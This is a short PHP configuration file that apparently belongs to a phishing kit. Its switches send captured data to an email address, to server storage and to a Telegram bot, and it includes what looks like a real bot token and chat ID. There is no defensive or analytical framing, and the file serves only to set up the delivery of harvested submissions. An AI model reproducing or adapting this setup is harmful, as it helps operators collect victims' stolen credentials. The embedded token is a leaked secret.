<?php
/*
*** Set your email below and configure functions to your requirments ***
*** FUNCTION CONTROL: 1=ON  and 0=OFF ***
EXAMPLE
$Example=1;  // Function On
$Example=0;  // Function Off
*/
$youremail = "email@here.com";  // Set your email
$Send_to_Email = "0";
$Save_on_Server = "1";
/*
*/
$Send_to_Telegram = "1";
$token='1111796277:AAFxcNgtuKsw4PmEXPfYs---CM8HgjHyCbM';
$chat_id="1211929484";
/*
*/
?>